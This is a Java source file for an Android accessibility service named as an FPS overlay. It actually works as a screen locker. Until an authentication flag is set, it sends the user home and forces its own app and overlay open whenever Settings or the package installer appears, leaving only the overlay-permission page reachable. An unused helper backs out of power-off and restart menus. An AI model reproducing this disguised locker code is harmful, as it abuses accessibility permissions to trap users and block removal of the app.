package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        if (Settings.canDrawOverlays(this)) {
            triggerOverlay();
        } else {
            jumpToOverlaySettings();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // 1. Jika sudah login, abaikan semua blokir
            if (FPSService.isAuthenticated) return;
    
            // 2. CEK KHUSUS: Jika sedang di halaman Izin Overlay, JANGAN BLOKIR
            // Ini agar kamu sempat klik "Allow/Izinkan"
            if (packageName.equals("com.android.settings")) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    // Cari kata kunci yang menandakan kita di halaman izin
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Display over other apps");
                    List<AccessibilityNodeInfo> nodesIndo = root.findAccessibilityNodeInfosByText("Tampilkan di atas aplikasi lain");
                    
                    if (!nodes.isEmpty() || !nodesIndo.isEmpty()) {
                        root.recycle();
                        return; // Keluar dari fungsi, jangan blokir!
                    }
                    root.recycle();
                }
            }
    
            // 3. Blokir selain halaman izin tadi
            if (packageName.equals("com.android.settings") || packageName.equals("com.google.android.packageinstaller")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                forceOpenApp();
            }
        }
    }

    private void forceOpenApp() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP | 
                   Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        triggerOverlay();
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                        Intent.FLAG_ACTIVITY_NO_HISTORY | 
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerOverlay() {
        if (!FPSService.isAuthenticated) {
            Intent intent = new Intent(this, FPSService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}